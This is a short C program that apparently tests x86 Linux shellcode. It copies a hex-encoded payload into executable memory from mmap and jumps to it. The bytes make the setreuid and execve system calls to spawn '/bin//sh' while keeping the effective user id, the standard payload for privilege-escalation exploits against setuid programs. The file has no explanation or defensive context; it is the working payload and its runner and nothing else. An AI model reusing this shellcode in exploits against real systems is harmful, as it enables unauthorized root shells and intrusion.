#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
int (*sc)();
unsigned char shellcode[] ="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
                                "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
                                "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80";
int main()
{
    printf("Shellcode Length: %d\n", sizeof(shellcode)-1);
    void *ptr = mmap(0, 30, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (ptr == MAP_FAILED) 
    {
      perror("mmap");
      exit(-1);
    }
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
    sc();
}
